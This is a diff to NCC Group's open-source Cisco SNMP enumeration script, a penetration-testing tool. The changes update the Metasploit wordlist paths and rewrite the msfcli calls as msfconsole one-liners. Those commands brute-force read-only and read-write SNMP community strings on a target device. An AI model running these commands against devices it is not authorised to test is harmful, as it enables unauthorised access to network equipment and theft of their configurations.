@@ -6,22 +6,24 @@
 # Twitter = @commonexploits
 # 29/05/2012
 # Requires metasploit, snmpwalk and john the ripper - suggest backtrack as built in (tested on BT5)
-VERSION="1.5" # updated 24/11/12 to include decoding of any local users.
+VERSION="1.6" # updated 15/03/15 by tom dot watson @ nccgroup dot com - See README for details 
 
 #####################################################################################
 # Released as open source by NCC Group Plc - http://www.nccgroup.com/
 
 # Developed by Daniel Compton, daniel dot compton at nccgroup dot com
+# Updated by tom.watson @ nccgroup.com
 
 # https://github.com/nccgroup/cisco-SNMP-enumeration
 
-#Released under AGPL see LICENSE for more information
+# Released under AGPL see LICENSE for more information
 
 ######################################################################################
 
 
 # user config settings
-COM_PASS="/opt/metasploit/msf3/data/wordlists/snmp_default_pass.txt" #location of snmp communities to try
+COM_PASS1="/opt/metasploit/msf3/data/wordlists/snmp_default_pass.txt" #old location of snmp communities to try
+COM_PASS2="/opt/metasploit/apps/pro/data/wordlists/snmp_default_pass.txt" #new location of snmpt communities to try
 OUTPUTDIR="/tmp/" #where config files downloaded will be stored
 SNMPVER="2c" #2c or change to 1
 PORT="161" #default snmp port
@@ -94,6 +96,25 @@ else
 		echo ""
         echo -e "\e[00;31mUnable to find the required screen program, script can continue but won't be able to crack any MD5 passwords\e[00m"
 fi
+
+#Check for default community string file
+if [ -f $COM_PASS1 ]
+    then
+        COM_PASS=$COM_PASS1
+        echo ""
+        echo -e "\e[00;32mI have found the community strings file\e[00m"
+    elif [ -f $COM_PASS2 ]
+        then
+            COM_PASS=$COM_PASS2
+            echo ""
+            echo -e "\e[00;32mI have found the community strings file\e[00m"
+    else    
+        echo ""
+        echo -e "\e[00;31mUnable to find the community strings file\e[00m"
+        exit 1
+fi
+
+
 echo ""
 echo "--------------------------------------------- Settings -----------------------------------------------"
 echo ""
@@ -155,7 +176,7 @@ COMNO=`cat "$COM_PASS" | wc -l`
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
 echo "Now testing read only SNMP communities with "$COMNO" strings - please wait...."
 echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
-READCOM=`msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=$CISCOIP PASS_FILE=$COM_PASS RETRIES=1 RPORT=$PORT THREADS=$THREADS VERSION=1 E 2>&1 |grep "READ-ONLY" | cut -d "'" -f 2`
+READCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION 1 E; run; exit -y" 2>&1 |grep -i "READ-ONLY" | cut -d "'" -f 2`
 clear
 if [ -z "$READCOM" ]
 then
@@ -182,7 +203,8 @@ echo -e "\e[1;33m---------------------------------------------------------------
 echo "Now testing for writable SNMP communities with "$COMNO" strings - please wait...."
 echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
 echo ""
-WRITCOM=`msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=$CISCOIP PASS_FILE=$COM_PASS RETRIES=1 RPORT=$PORT THREADS=$THREADS VERSION=1 E 2>&1 |grep "READ-WRITE" | cut -d "'" -f 2`
+WRITCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION 1 E; run; exit -y" 2>&1 |grep -i "READ-WRITE" | cut -d "'" -f 2`
+#WRITCOM=`msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=$CISCOIP PASS_FILE=$COM_PASS RETRIES=1 RPORT=$PORT THREADS=$THREADS VERSION=1 E 2>&1 |grep -i "READ-WRITE" | cut -d "'" -f 2`
 if [[ -z "$READCOM" && -z "$WRITCOM" ]]
 then
 	echo -e "\e[1;31mI didnt find any read or write community strings. Try setting the COM_PASS value in the script to a custom list and try again. It is possible that the community has a access-list applied. I can't continue, script will exit\e[00m"
